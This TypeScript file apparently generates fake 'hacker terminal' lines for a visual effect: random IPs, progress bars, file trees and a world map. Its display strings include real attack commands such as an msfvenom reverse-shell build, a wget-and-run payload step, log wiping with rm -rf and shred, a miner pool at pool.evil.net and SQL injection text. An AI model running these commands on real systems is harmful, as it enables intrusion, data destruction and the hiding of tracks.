const rand = (a: number, b: number) => Math.floor(Math.random() * (b - a + 1)) + a;
const pick = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
const randIP = () => {
  const fns = [
    () => `192.168.${rand(0, 255)}.${rand(1, 254)}`,
    () => `10.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`,
    () => `172.${rand(16, 31)}.${rand(0, 255)}.${rand(1, 254)}`,
    () => `${rand(1, 223)}.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`,
  ];
  return pick(fns)();
};
const randHex = (n = 8) => '0x' + Array.from({ length: n }, () => '0123456789ABCDEF'[rand(0, 15)]).join('');
const randPort = () => pick([21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443, 9090]);

const pBar = (pct: number) => {
  const f = Math.round(pct / 100 * 20);
  return '[' + '█'.repeat(f) + '░'.repeat(20 - f) + '] ' + pct + '%';
};

export interface TermLine {
  text: string;
  color?: 'green' | 'cyan' | 'red' | 'white' | 'yellow' | 'dim';
}

export function getRandomLine(): TermLine {
  const lines: Array<{ t: string | (() => string); c?: TermLine['color'] }> = [
    { t: '> Initializing exploit framework v4.2.1...' },
    { t: '> Loading payload: reverse_shell.py' },
    { t: () => `> Scanning target: ${randIP()}`, c: 'cyan' },
    { t: () => `> Port ${randPort()} OPEN — ${pick(['SSH', 'HTTP', 'HTTPS', 'FTP', 'SMTP', 'MySQL', 'RDP', 'Telnet'])} detected`, c: 'cyan' },
    { t: '> Brute forcing credentials...' },
    { t: () => `> Brute forcing ${pBar(rand(30, 99))} — ${rand(100000, 999999).toLocaleString()} attempts` },
    { t: '> [SUCCESS] Password found: ********', c: 'yellow' },
    { t: '> Uploading backdoor to /tmp/.hidden...' },
    { t: '> Executing remote command: whoami' },
    { t: '  root', c: 'white' },
    { t: '> Dumping /etc/passwd...' },
    { t: '> Dumping /etc/shadow...' },
    { t: '> Decrypting hash: 5f4dcc3b5aa765d61d8327deb882cf99' },
    { t: '  Result: "password"', c: 'yellow' },
    { t: '> Establishing persistent connection...' },
    { t: '> Erasing logs...', c: 'red' },
    { t: '> rm -rf /var/log/*', c: 'red' },
    { t: () => `> Connection to ${randIP()} secured`, c: 'cyan' },
    { t: () => `> Downloading ${rand(1, 99)}.${rand(0, 9)} GB of data...` },
    { t: () => `  ${randHex(8)} ${randHex(8)} ${randHex(8)} ${randHex(8)}`, c: 'dim' },
    { t: () => `  ${randHex(8)} ${randHex(8)} ${randHex(8)} ${randHex(8)}`, c: 'dim' },
    { t: '> SELECT * FROM users WHERE admin=1;', c: 'cyan' },
    { t: "  ' OR 1=1; DROP TABLE users; --", c: 'red' },
    { t: '  +----+----------+------------------+-------+', c: 'white' },
    { t: '  | id | username | email            | admin |', c: 'white' },
    { t: '  +----+----------+------------------+-------+', c: 'white' },
    { t: '  |  1 | root     | root@system.net  |     1 |', c: 'white' },
    { t: '  |  7 | admin    | admin@corp.io    |     1 |', c: 'white' },
    { t: '  +----+----------+------------------+-------+', c: 'white' },
    { t: () => `> RECV ${rand(100, 9999)} bytes from ${randIP()}:${randPort()}` },
    { t: () => `> SEND ${rand(100, 9999)} bytes to ${randIP()}:${randPort()}` },
    { t: '> Traceback (most recent call last):', c: 'red' },
    { t: () => `    File "exploit.py", line ${rand(10, 200)}, in <module>`, c: 'red' },
    { t: '      payload.execute(target)', c: 'red' },
    { t: '  ConnectionRefusedError: [Errno 111] Connection refused', c: 'red' },
    { t: '> [RETRY] Re-establishing tunnel...', c: 'yellow' },
    { t: '> Connection re-established.' },
    { t: () => `> sudo nmap -sV -O ${randIP()}`, c: 'cyan' },
    { t: '> Starting Nmap 7.94 ( https://nmap.org )' },
    { t: () => `> Host is up (0.0${rand(10, 99)}s latency).` },
    { t: '> OS detection: Linux 5.15 (98%)' },
    { t: '> Accessing mainframe...' },
    { t: () => `> Bypassing firewall ${pBar(rand(60, 99))}` },
    { t: '> Firewall bypassed successfully.', c: 'yellow' },
    { t: '> Injecting shellcode into process memory...' },
    { t: '> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf' },
    { t: '> chmod +x shell.elf && ./shell.elf' },
    { t: '> [*] Meterpreter session 1 opened', c: 'yellow' },
    { t: '> sysinfo' },
    { t: '  Computer: TARGET-SRV01', c: 'white' },
    { t: '  OS: Ubuntu 22.04 (Linux 5.15.0-91-generic)', c: 'white' },
    { t: '  Architecture: x86_64', c: 'white' },
    { t: '  Meterpreter: x64/linux', c: 'white' },
    { t: '> hashdump' },
    { t: () => `  root:$6$${randHex(4)}$${randHex(16)}:::`, c: 'dim' },
    { t: () => `  admin:$6$${randHex(4)}$${randHex(16)}:::`, c: 'dim' },
    { t: '> Privilege escalation: checking sudo -l' },
    { t: '  User may run the following commands:', c: 'white' },
    { t: '    (ALL) NOPASSWD: ALL', c: 'yellow' },
    { t: '> [*] Root access confirmed.', c: 'yellow' },
    { t: '> Deploying keylogger on tty1...' },
    { t: '> cat /var/log/auth.log | grep "Failed password"' },
    { t: () => `  ${rand(1, 12)} failed login attempts from ${randIP()}`, c: 'white' },
    { t: '> Launching DDoS amplification test...', c: 'red' },
    { t: () => `> Sending ${rand(100, 999)} SYN packets to ${randIP()}`, c: 'red' },
    { t: '> iptables -A INPUT -s 0.0.0.0/0 -j DROP', c: 'red' },
    { t: () => `> Spoofing MAC address: ${Array.from({ length: 6 }, () => randHex(1).slice(2)).join(':')}` },
    { t: '> ARP cache poisoned.', c: 'yellow' },
    { t: '> Sniffing packets on eth0...' },
    { t: () => `> Captured ${rand(100, 9999)} packets (${rand(1, 50)} MB)` },
    { t: '> Extracting credentials from pcap...' },
    { t: '> [FOUND] FTP login — user: admin pass: admin123', c: 'yellow' },
    { t: '> SSH tunnel established: localhost:8080 -> target:80' },
    { t: '> Proxychains activated. Routing through 3 nodes.' },
    { t: () => `> Node 1: ${randIP()} (${pick(['Bucharest', 'Moscow', 'Tokyo', 'São Paulo', 'Lagos', 'Mumbai'])})`, c: 'cyan' },
    { t: () => `> Node 2: ${randIP()} (${pick(['Berlin', 'Seoul', 'Nairobi', 'Lima', 'Cairo', 'Jakarta'])})`, c: 'cyan' },
    { t: () => `> Node 3: ${randIP()} (${pick(['Reykjavik', 'Singapore', 'Dublin', 'Havana', 'Oslo'])})`, c: 'cyan' },
    { t: '> Wiping bash_history...' },
    { t: '> unset HISTFILE && history -c' },
    { t: '> Compiling rootkit: make -C /dev/shm/rk/' },
    { t: '  gcc -Wall -O2 -o rootkit rootkit.c', c: 'dim' },
    { t: '  [OK] Rootkit compiled successfully.', c: 'yellow' },
    { t: '> insmod /dev/shm/rk/rootkit.ko' },
    { t: '> [*] Kernel module loaded. Process hidden.', c: 'yellow' },
    { t: '> Exfiltrating database: mysqldump -u root -p corp_db > dump.sql' },
    { t: () => `> ${rand(10000, 99999)} rows exported.` },
    { t: '> Encrypting dump with AES-256-CBC...' },
    { t: '> Transfer complete. Cleaning up artifacts.' },
    { t: '> find / -name "*.log" -exec shred -vfz {} \\;' },
    { t: () => `> [${new Date().toISOString()}] Operation logged.`, c: 'dim' },
    { t: '> Deploying cryptominer to /tmp/.x11-unix/...', c: 'red' },
    { t: '> Mining pool: stratum+tcp://pool.evil.net:3333', c: 'red' },
    { t: () => `> Hashrate: ${rand(50, 999)} H/s`, c: 'yellow' },
    { t: '> Checking for honeypots...' },
    { t: '> [CLEAR] No honeypot signatures detected.' },
    { t: '> Scanning internal subnet 10.0.0.0/24...' },
    { t: () => `> Found ${rand(3, 25)} live hosts.`, c: 'cyan' },
    { t: '> Lateral movement: pass-the-hash attack' },
    { t: '> [SUCCESS] Pivoted to DC01.corp.local', c: 'yellow' },
    { t: '> Extracting NTDS.dit...' },
    { t: '> secretsdump.py -just-dc corp/admin@10.0.0.1' },
    { t: '> Domain admin hash retrieved.', c: 'yellow' },
    { t: () => `> DNS poisoning: ${randIP()} -> evil.com` },
    { t: '> SSL certificate forged for target domain.', c: 'red' },
    { t: '> MITM proxy active on port 8443.' },
    { t: '> Intercepting HTTPS traffic...', c: 'red' },
    { t: '> --- BEGIN RSA PRIVATE KEY ---', c: 'dim' },
    { t: () => `> ${randHex(16)}${randHex(16)}`, c: 'dim' },
    { t: '> --- END RSA PRIVATE KEY ---', c: 'dim' },
    { t: () => `> ssh -i ~/.ssh/id_rsa root@${randIP()}` },
    { t: '> Welcome to Ubuntu 22.04.3 LTS', c: 'white' },
    { t: () => `> Last login: ${new Date().toUTCString()} from ${randIP()}`, c: 'dim' },
    { t: () => `> [+] Shell obtained on ${randIP()}`, c: 'yellow' },
    { t: () => `> Exfiltrating: /home/user/Documents/financials_${rand(2020, 2025)}.xlsx` },
    { t: () => `> exec(base64.b64decode("${btoa(String.fromCharCode(...Array.from({ length: 20 }, () => rand(65, 122))))})"))` },
    { t: () => `> [-] Connection timeout, retrying...`, c: 'red' },
    { t: () => `> netstat -tlnp | grep ${randPort()}` },
    { t: () => `  tcp  0  0  0.0.0.0:${randPort()}  0.0.0.0:*  LISTEN  ${rand(1000, 9999)}/sshd`, c: 'dim' },
    { t: () => `> [${rand(10000, 99999)}.${rand(100, 999)}] iptables: chain BYPASS_FW accepted`, c: 'dim' },
    { t: '> curl -s http://ifconfig.me' },
    { t: () => `  ${randIP()}`, c: 'white' },
    { t: '> python3 -c "import pty; pty.spawn(\'/bin/bash\')"' },
    { t: '> export TERM=xterm-256color' },
    { t: () => `> wget -q https://${randIP()}/payload.bin -O /tmp/.cache` },
    { t: '> [*] Payload downloaded successfully.', c: 'yellow' },
    { t: '> chmod 777 /tmp/.cache && /tmp/.cache &' },
    { t: '> Reverse shell callback received.', c: 'yellow' },
    { t: () => `> Cracking WPA2 handshake: ${pBar(rand(10, 95))}` },
    { t: '> airmon-ng start wlan0', c: 'cyan' },
    { t: '> airodump-ng wlan0mon', c: 'cyan' },
    { t: () => `> BSSID: ${Array.from({ length: 6 }, () => rand(0, 255).toString(16).padStart(2, '0')).join(':')}  CH: ${rand(1, 13)}  ESSID: ${pick(["Corp_WiFi", "NETGEAR_5G", "FBI_Van", "TotallyNotAHacker"])}`, c: 'white' },
    { t: '> hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target', c: 'cyan' },
    { t: () => `> [${rand(1, 9999)}][ssh] host: ${randIP()} login: admin password: ${pick(["Password1!", "admin123", "root", "letmein", "qwerty2024"])}`, c: 'yellow' },
    { t: '> gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt', c: 'cyan' },
    { t: '  /admin         (Status: 200) [Size: 4521]', c: 'white' },
    { t: '  /backup        (Status: 301) [Size: 0]', c: 'white' },
    { t: '  /config        (Status: 403) [Size: 289]', c: 'white' },
    { t: '  /.git          (Status: 200) [Size: 23]', c: 'yellow' },
    { t: () => `> git clone http://${randIP()}/.git/ leaked_source`, c: 'cyan' },
    { t: '> Cloning into \'leaked_source\'... done.' },
    { t: () => `> grep -r "password" leaked_source/ | head -${rand(3, 10)}` },
    { t: '  config.py:DB_PASSWORD = "Sup3rS3cret!!"', c: 'yellow' },
    { t: '  .env:API_KEY=sk-proj-xxxxxxxxxxxxxxxxxxxx', c: 'yellow' },
    { t: '> john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },
    { t: () => `> ${rand(2, 8)}g 0:00:0${rand(1, 9)}:${rand(10, 59)} ${(rand(100, 9999) / 10).toFixed(1)}% (ETA: ${rand(10, 59)}:${rand(10, 59)})` },
    { t: '> Session completed. 3 passwords cracked.', c: 'yellow' },
    { t: `> UPDATE users SET role='admin' WHERE id=1; -- injected`, c: 'red' },
    { t: '> [!] WAF detected — switching to encoding bypass', c: 'yellow' },
    { t: '> Using double URL encoding + Unicode normalization', c: 'dim' },
    { t: '> [+] WAF bypassed successfully', c: 'yellow' },
    { t: () => `> tcpdump -i eth0 -w capture_${rand(1000, 9999)}.pcap`, c: 'cyan' },
    { t: () => `> ${rand(500, 5000)} packets captured`, c: 'dim' },
    { t: '> tshark -r capture.pcap -Y "http.request.method == POST"', c: 'cyan' },
    { t: '> Extracting session cookies from HTTP traffic...', c: 'red' },
    { t: () => `> Cookie: session=${Array.from({ length: 32 }, () => '0123456789abcdef'[rand(0, 15)]).join('')}`, c: 'dim' },
    { t: '> Session hijacked successfully.', c: 'yellow' },
  ];

  const entry = pick(lines);
  const text = typeof entry.t === 'function' ? entry.t() : entry.t;
  return { text, color: entry.c };
}

export const fileTrees = [
  `  /root
  ├── exploit.py
  ├── passwords.txt
  ├── keylogger.sh
  ├── dump.sql.enc
  └── /logs
      ├── auth.log
      ├── access.log
      └── captured.pcap`,
  `  /opt/tools
  ├── nmap
  ├── metasploit/
  │   ├── msfconsole
  │   └── msfvenom
  ├── john/
  │   └── john.conf
  ├── hydra
  └── sqlmap/
      └── sqlmap.py`,
  `  /home/target/.ssh
  ├── authorized_keys
  ├── id_rsa
  ├── id_rsa.pub
  └── known_hosts`,
];

export const asciiMap = [
  "                              . _..::__:  ,-\"-\"._        |   7       ,     _,.__          ",
  "                      _.___ _ _<_>`!(._`.`-.    /        _._     `_ ,_/  '  '-._.---.-.__  ",
  "                    .{     \" \" `-==,',._\\{  \\  / {)     / _ \">_,-' `                mt-2_ ",
  "                     \\_.:--.       `._ )`^-)    '      / (  ' )                           ",
  "                    '\"'     \\         \"    _/   //      \\  `-' `-  ///                     ",
  "                             `.       ___  /    /  /     `-._,--'    /                      ",
  "                               `._ .-'   `E/  //  /          \\      /                      ",
  "                  _.--..______    \\/  /    //  /     \\    .-,.__    /                       ",
  "              _.-'   M  O S  \\   '  //  //   /      \\  /    \"-.__/                        ",
  "             /__.--.  a  c  o  \\   //  //   /        \\/                                    ",
  "          _-'    __-'  i  e  u  \\///  //                                                   ",
  "         '-.__.-'       n  a  t  \\   /                                                     ",
  "                         f  n  h                                                           ",
  "                          r     .                                                          ",
  "                           a                                                               ",
  "                            m                                                              ",
  "                             e                                                             ",
];

export const mapLocations = [
  { name: 'NEW YORK', lat: '40.7128°N', lon: '74.0060°W' },
  { name: 'LONDON', lat: '51.5074°N', lon: '0.1278°W' },
  { name: 'TOKYO', lat: '35.6762°N', lon: '139.6503°E' },
  { name: 'MOSCOW', lat: '55.7558°N', lon: '37.6173°E' },
  { name: 'SYDNEY', lat: '33.8688°S', lon: '151.2093°E' },
  { name: 'SÃO PAULO', lat: '23.5505°S', lon: '46.6333°W' },
  { name: 'MUMBAI', lat: '19.0760°N', lon: '72.8777°E' },
  { name: 'CAIRO', lat: '30.0444°N', lon: '31.2357°E' },
  { name: 'SINGAPORE', lat: '1.3521°N', lon: '103.8198°E' },
  { name: 'BERLIN', lat: '52.5200°N', lon: '13.4050°E' },
  { name: 'NAIROBI', lat: '1.2921°S', lon: '36.8219°E' },
  { name: 'BUENOS AIRES', lat: '34.6037°S', lon: '58.3816°W' },
  { name: 'DUBAI', lat: '25.2048°N', lon: '55.2708°E' },
  { name: 'SEOUL', lat: '37.5665°N', lon: '126.9780°E' },
  { name: 'CHICAGO', lat: '41.8781°N', lon: '87.6298°W' },
  { name: 'FRANKFURT', lat: '50.1109°N', lon: '8.6821°E' },
];

export const processNames = [
  '/usr/bin/sshd', 'exploit.py', 'nmap', 'msfconsole', 'keylogger.sh',
  '/usr/bin/python3', 'hydra', 'sqlmap', 'john', 'tcpdump',
  'proxychains', 'socat', 'netcat', 'hashcat', 'data_exfil.sh',
  'reverse_shell', 'ssh root@victim', '/usr/sbin/apache2', 'mysqld', 'redis-server',
];
